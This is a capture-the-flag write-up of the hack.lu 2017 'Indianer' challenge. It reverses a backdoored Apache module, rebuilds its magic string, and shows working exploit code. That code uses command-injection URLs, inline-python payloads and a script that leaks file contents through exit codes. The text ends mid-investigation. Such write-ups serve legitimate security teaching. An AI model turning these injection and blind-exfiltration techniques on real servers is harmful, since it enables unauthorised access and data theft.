Hacklu 2017/ Indianer write-up  pwn/web
========================================

> This is a joint write-up for the hacklu 2017 ctf problem indianer; completed by Sai Vegasena and Roy Xu, two members of NYUSEC. The challenge was tagged web/pwn.

> Initially, the challenge included a [binary](svv232/Indianer-hacklu-2017/blob/master/backdoor.so) and a link to a [regular website](https://indianer.flatearth.fluxfingers.net/) that had a "super secret" backdoor.

> After downloading and unzipping, we noticed the .so file header on the binary, indicating that it was a shared object. This meant it was a small part of a whole-some code base that we did not have access to. There was also nothing that could be executed within the file meaning dynamic analysis was not a plausible strategy. Fortunately, after opening the file in binary ninja we uncovered a few key points that brought forth some clarity.

[picture]()

> The binary was essentially a libc wrapper that the Apache server the website was hosted on was using as an API. We concluded it was an Apache server after making the webpage error out , by typing random gibberish in the url, and reading the error-message. Your usual set of functions were being used in the wrapper, except for a custom strlen function. Analyzing the control flow of strlen introduced some abnormality and exploitability.

Here is binja's [strlen dissasembly]()
-------------------------------------

[picture]()

> First off, there  was a system call in this block of the function, so the remainder of our exploitation was geared towards writing into the sys-call to leak the flag.

[picture]()

> Looking back at the start of the function, strcmp is called at 0xa0c checking if
data_da0, or the string 'GET' ,indicated in hex view,,  was the request type. Trigger, a variable in the GOT, was incremented if that was the case. The string "ndex.html" was then checked for at 0xa48; if "ndex.html" existed and the function was in debug mode the function would have jumped passed the system call block and the debug and counter GOT variables would have been reset. This meant either "ndex.html" should have existed in the GET request or debug mode had to be set for any
exploit to work. We also figured out that an interesting error message would appear if "ndex.html" was in the GET request.

[picture]()

> After a successful GET request with "ndex.html" was sent the message would be directed to this block of code. There an algorithm with ordinal operations, bit swapping, and string operations would be implemented on the variable _ in the GOT, and the counter and trigger variables would be updated accordingly. By the end of all the string operations on _ ,a magic string would be created. Essentially, if this magic string was in the GET request and set equal to a command low priority
shell access would be granted.

> Ex. - url/magic_string=command

[picture]()


[picture]()

> Reproducing the magic string was starting to get slightly more difficult, so we decided to open up the shared object binary in IDA, and used hexrays to decipher what the algorithm was doing with the _ variable in the GOT. This way we could reproduce
the string and gain command injection into the system call as a relatively unprivileged user.

Here is the [IDA disassembly]()
-------------------------------

> As you can see it is much neater. Lines 31 - 74 were what we reversed and re
wrote to spot the behavior , and re-emulate the algorithm.

[picture]()

> We used this code to write a [python script]() that reproduced the magic string with
some help from our friend [Josh](www.hypersonic.me), another member of NYUSEC.

The output of the script was ...
    ``` dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp ```

So we had successfully recreated the magic_string!!!

> We tested with the following command

'https://indianer.flatearth.fluxfingers.net/0ndex.html/ dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp=' + sleep(10) + '_%23'

There was a successful sleep!!


Remote Code Execution
--------------

With access to remote code execution, we first tried to see if we
could send the flag to ourselves with the netcat command. However, after failing to send /etc/passwd, a file that has to exist in every linux box, we came to the conclusion that outbound connections were blocked. We also realized that we didn't know where the flag was located.

At this point, we went back and looked at the binary again to see if we missed something. We took a look at the debug global we noticed earlier. After executing the system call, the debug global is set to the return of the call. The value of the debug global is then added to the character directly before "ndex.html" in the HTTP request and the debug global is reset to 0. Knowing this we tried the following request:

```https://indianer.flatearth.fluxfingers.net/0ndex.html/dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp=exit_5_%23```

The resulting page is shown below:

[picture]()

The page tells us that  ```The requested URL /5ndex.html/ was not found on this server.``` The difference between the first character of our input ```0ndex.html``` and the return of the server ```5ndex.html``` is ```5``` meaning that the system call was a success and we can access the exit codes of our commands.

After some testing we discovered that we had access to inline python. Running the command:

```python -c "exec('exit(5)')"```

Returned an exit code of 5, confirming that the code was successfully running.

Flag Exfiltration
------------------

To find the flag, we wrote a simple python script to search through all the subdirectories of a given directory to find a file containing the string "flag{". A counter is used to indicate which character in the file to exit with. By observing the exit codes as we progress the counter, we should be able to read the file containing the flag. If no file with "flag{" is found, the script exits with 5. We also realized that there would be errors when attempting to read files we did not have access to. By wrapping the file open in a try block and excepting on IOErrors, we were able to avoid the problem.

```python
import os
import sys

counter = 1
for (dirpath, dirnames, filenames) in os.walk('.'):
    for fname in filenames:
        try:
            with open(os.path.join(dirpath, fname), 'r') as f:
                fbody = f.read()
                if 'flag{' in fbody:
                    exit(ord(fbody[fbody.index('flag{') + 4:][counter]))
        except IOError:
            pass
exit(5)
```

The script needed to be transformed into a one liner, so we converted newlines to ```\\n``` and tabs to ```\\t```. The newlines and tabs needed to be double escaped because python would attempt to resolve the escapes. We also needed to double escape our quotes to avoid problems when wrapped in an ```exec``` for the inline python command. This resulted in the following command:

```
import os\\nimport sys\\ncounter = 0\\nfor (dirpath, dirnames, filenames) in os.walk(\\'.\\'):\\n\\tfor fname in filenames:\\n\\t\\tif fname == \\'backdoor.c\\':\\n\\t\\t\\texit(6)\\n\\t\\ttry:\\n\\t\\t\\twith open(os.path.join(dirpath, fname), \\'r\\') as f:\\n\\t\\t\\t\\tfbody = f.read()\\n\\t\\t\\t\\tif \\'flag{\\' in fbody:\\n\\t\\t\\t\\t\\texit(ord(fbody[fbody.index(\\'flag{\\') + 5:][counter]))\\n\\t\\texcept IOError:\\n\\t\\t\\tpass\\nexit(5)
```

We then wrote a script to send the appropriate requests to the web server and parse out the exit code.

```python
import requests


counter = 0
while True:
    request_0 = "import os\\nimport sys\\ncounter = "
    request_1 = "\\nfor (dirpath, dirnames, filenames) in os.walk(\\'/home\\'):\\n\\tfor fname in filenames:\\n\\t\\tif fname == \\'backdoor.c\\':\\n\\t\\t\\texit(6)\\n\\t\\ttry:\\n\\t\\t\\twith open(os.path.join(dirpath, fname), \\'r\\') as f:\\n\\t\\t\\t\\tfbody = f.read()\\n\\t\\t\\t\\tif \\'flag{\\' in fbody:\\n\\t\\t\\t\\t\\texit(ord(fbody[fbody.index(\\'flag{\\') + 5:][counter]))\\n\\t\\texcept IOError:\\n\\t\\t\\tpass\\nexit(5)"
    request = request_0 + str(counter) + request_1
    request = 'python -c \"exec(\'{}\')\"'.format(request)
    request = request.replace('\\', '%5C')
    request = request.replace(' ', '_')
    request = request.replace('+', '%2B')
    url = 'https://indianer.flatearth.fluxfingers.net/index.html/dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp=' + request + '_%23'
    reset = 'https://indianer.flatearth.fluxfingers.net/index.html'

    chr_resp = 0
    while chr_resp == 0 or chr_resp == 2:
        r = requests.get(url)
        while 'Not Found' not in r.text or 'dpdpdpamamamam' in r.text:
            r = requests.get(url)

        res = r.text
        chr_resp = ord(res[res.index('ndex') - 1]) - ord('i')
        print('retry', chr_resp)
    print('real_num', chr_resp)
    try:
        print('real', chr(chr_resp))
    except:
        print('real', 'unprintable')

    requests.get(reset)
    counter += 1
```

We replaced all slashes and plus signs to their url encoded versions. Spaces were
replaced with underscores, because the binary would convert them to spaces for us.
The server was a bit unresponsive and would error out at times. In some cases, we would receive a bad gateway error, so if we did not reach a page that contained "Not Found", we retried the connection. There were also cases where the backdoor was not processed. In those cases, the needle was not processed out of the url and so we checked for the existence of the needle in the return to avoid those cases. On successful requests, we parsed out the character directly before "ndex.html" and found the difference from 'i'. We noticed that there were times when the system call would not go through. In those cases we received an exit code of 2 or 0. In those cases, we retried the request. On success, we increment the counter and repeat.

Failure and Frustration
------------------------

Attempting to run the python script resulted in an exit code of 2 almost constantly. In several very short bursts we were able to see the expected error codes. We were unable to find the flag in almost all of the standard linux folders (/var, /tmp, /root, etc.). We then attempted to list the root directories with the following python script.

```python
exit(ord(''.join(os.listdir('/'))[counter]))
```
